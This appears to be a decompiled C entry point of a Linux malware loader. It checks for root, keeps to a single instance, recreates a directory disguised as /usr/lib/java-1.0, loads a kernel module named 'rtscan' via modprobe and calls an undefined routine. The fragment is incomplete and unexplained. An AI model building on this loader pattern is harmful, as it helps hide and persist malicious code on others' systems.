#include <stdint.h>

int main(int argc, char** argv) {
	
	char* program = argv[0];

	if (getuid() != 0) {
		printf_chk(1, "not root\n");
		return 0;
	}

	if (isRunningProcess(program) != 0) {
		return 0;
	}

	if (access("/usr/lib/java-1.0", F_OK) != -1) {
		deldir("/usr/lib/java-1.0");
	}
	mkdir("/usr/lib/java-1.0", 0x777);

	int length = strlen(argv[0]);
	int lastchar = length - 1;
	if (lastchar < 0) {
		return 0;
	}
	
	while (program[lastchar] == '\\' || program[lastchar] == '/') {
		lastchar--;
		if (lastchar == -1) {
			return 0;
		}
	}

	memcpy_chk(gszCurDir, 0x400, lastchar, program);
	gszCurDir[lastchar + 1] = '\0';

	system("modprobe rtscan");
	int result = opprcmain();

	if (result != -1) {
		return 1;
	}

	printf_chk(1, "opprcmain error");
	return -1;
}
